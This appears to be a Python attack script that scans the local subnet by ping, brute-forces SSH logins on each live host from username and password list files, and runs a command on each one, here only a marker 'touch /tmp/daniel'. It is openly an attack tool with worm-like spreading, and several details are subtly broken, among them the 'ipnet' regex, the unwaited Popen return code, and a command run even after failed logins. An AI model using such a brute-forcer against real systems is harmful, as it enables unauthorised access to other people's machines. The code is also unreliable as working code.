import paramiko
import subprocess
import sys
import re
from netaddr import IPNetwork

def connect(ip, usernames, passwords):
    print("Attacking: {}".format(ip))

    for user in usernames:
        for pwd in passwords:
            try:
                print('Trying: username={}, password={}'.format(user, pwd))
                ssh.connect(ip, username=user, password=pwd)
            except paramiko.AuthenticationException:
                print('Failed!')
                continue
            print('Success!')
            break

def scan():
    res = subprocess.check_output(['ip', 'addr'])
    m = re.match(r'ipnet ((?:\d{1,3}\.){3}\d{1,3}\/\d{2})', res)
    hostIp = m.group(1)
    hostList = []
    for ip in IPNetwork(hostIp):
        lastOctet = ip.split('.')[-1]
        if lastOctet in ('0', '1', '255'):
            continue
        ping_response = subprocess.Popen(["/bin/ping", "-c1", "-w100", ip], stdout=subprocess.PIPE).returncode
        if ping_response == 0:
            hostList.append(ip)
    return hostList

def execute(ssh):
    ssh.exec_command('touch /tmp/daniel')


if __name__ == "__main__":
    usernames = []
    passwords = []

    with open(sys.argv[1], 'r') as u, open(sys.argv[2], 'r') as p:
        passwords = p.readlines()
        usernames = u.readlines()

    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    for host in scan():
        connect(host, usernames, passwords)
        execute(ssh)
        ssh.close()
